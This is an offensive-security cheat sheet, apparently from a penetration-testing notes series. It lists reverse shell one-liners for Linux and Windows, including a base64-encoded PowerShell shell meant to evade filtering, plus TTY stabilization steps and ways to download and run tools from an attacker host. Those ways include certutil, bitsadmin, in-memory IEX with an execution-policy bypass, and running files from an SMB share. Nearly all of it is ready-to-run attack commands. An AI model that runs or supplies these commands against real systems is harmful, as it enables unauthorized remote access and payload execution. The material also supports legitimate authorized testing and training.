# 08 - Shell Stabilization & Cross-Platform File Transfers

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Reverse Shell Reference

### 1. Linux Reverse Shell One-Liners

#### Pure Bash (TCP):
```bash
bash -i >& /dev/tcp/192.168.100.5/4444 0>&1
/bin/bash -c "bash -i >& /dev/tcp/192.168.100.5/4444 0>&1"
```

#### Netcat (Named Pipe FIFO - Universal across Linux/BSD):
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.100.5 4444 >/tmp/f
```

#### Python 3 (Immediate PTY):
```bash
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

#### PHP:
```bash
php -r '$sock=fsockopen("192.168.100.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

### 2. Windows Reverse Shell One-Liners

#### PowerShell TCP Client:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Base64-Encoded PowerShell One-Liner (Bypasses special character filtering):
Generate on Kali:
```bash
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.100.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
```
Execute on Windows:
```cmd
powershell -nop -enc <BASE64_STRING>
```

---

## 💻 2. Full Interactive TTY Shell Stabilization

Raw reverse shells drop if you press `Ctrl+C`, cannot use tab-completion, and break when running interactive programs like `nano` or `su`.

### Technique 1: Python PTY Spawn + STTY Fix (Standard Linux)

1. Inside your raw reverse shell, spawn a bash PTY:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Or python2: python -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. Background the shell by pressing:
   ```text
   Ctrl + Z
   ```
3. In your local Kali terminal, configure your terminal to pass raw characters:
   ```bash
   stty raw -echo; fg
   ```
   *(Press Enter twice after typing `fg`)*
4. Reset your terminal state inside the target shell:
   ```bash
   reset
   export TERM=xterm-256color
   export SHELL=bash
   ```
5. Match the row and column dimensions of your local terminal:
   - On Kali (run `stty size` in a new tab, e.g. `38 140`)
   - Inside target shell:
     ```bash
     stty rows 38 columns 140
     ```
*You now have complete tab-completion, clear screen (`Ctrl+L`), and `Ctrl+C` interrupt handling!*

---

### Technique 2: Socat Fully Interactive TTY

#### Listener on Kali:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

#### Target Connection:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.100.5:4444
```

---

### Technique 3: Windows ConPtyShell (Fully Interactive Windows Console)
Provides full Windows console features (arrow keys, resize, tab completion):
1. Start listener on Kali:
   ```bash
   stty raw -echo; (stty size; cat) | nc -lvnp 4444
   ```
2. Execute on Windows target:
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.5/Invoke-ConPtyShell.ps1')
   Invoke-ConPtyShell 192.168.100.5 4444
   ```

---

## 🚚 3. Cross-Platform File Transfer Reference

### Setting up Servers on Kali

#### 1. Python HTTP Server:
```bash
python3 -m http.server 80
```

#### 2. Impacket SMB Server (Best for Windows Targets):
Supports executing binaries directly without writing to the target hard drive:
```bash
# Start SMB share named 'share'
sudo impacket-smbserver share $(pwd) -smb2support -user test -password test
```

---

### Linux Target File Download Methods

```bash
# cURL
curl http://192.168.100.5/linpeas.sh -o /tmp/linpeas.sh

# Wget
wget http://192.168.100.5/linpeas.sh -O /tmp/linpeas.sh

# Netcat Stream Transfer
# On Target:
nc -lvnp 9001 > /tmp/linpeas.sh
# On Kali:
nc 192.168.100.15 9001 < linpeas.sh

# Base64 One-Liner (No network utilities required)
# On Kali:
base64 -w 0 file.sh
# On Target:
echo "<BASE64_STRING>" | base64 -d > /tmp/file.sh
```

---

### Windows Target File Download Methods

#### 1. CertUtil (Native Windows Utility):
```cmd
certutil -urlcache -split -f http://192.168.100.5/winPEASany.exe C:\Users\Public\winPEAS.exe
```

#### 2. PowerShell WebClient:
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.5/nc.exe', 'C:\Users\Public\nc.exe')"
```

#### 3. PowerShell Invoke-WebRequest (`iwr`):
```powershell
powershell -c "iwr -Uri http://192.168.100.5/chisel.exe -OutFile C:\Users\Public\chisel.exe"
```

#### 4. In-Memory Execution (Bypasses Disk Writes):
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.5/Invoke-AllChecks.ps1')"
```

#### 5. Connecting to Kali SMB Server:
```cmd
:: Map network drive with credentials
net use \\192.168.100.5\share /user:test test

:: Execute directly from the network share without saving to disk!
\\192.168.100.5\share\winPEASany.exe quiet cmd

:: Or copy files locally:
copy \\192.168.100.5\share\chisel.exe C:\Users\Public\chisel.exe
```

#### 6. Bitsadmin:
```cmd
bitsadmin /transfer myDownloadJob /download /priority normal http://192.168.100.5/file.exe C:\Users\Public\file.exe
```
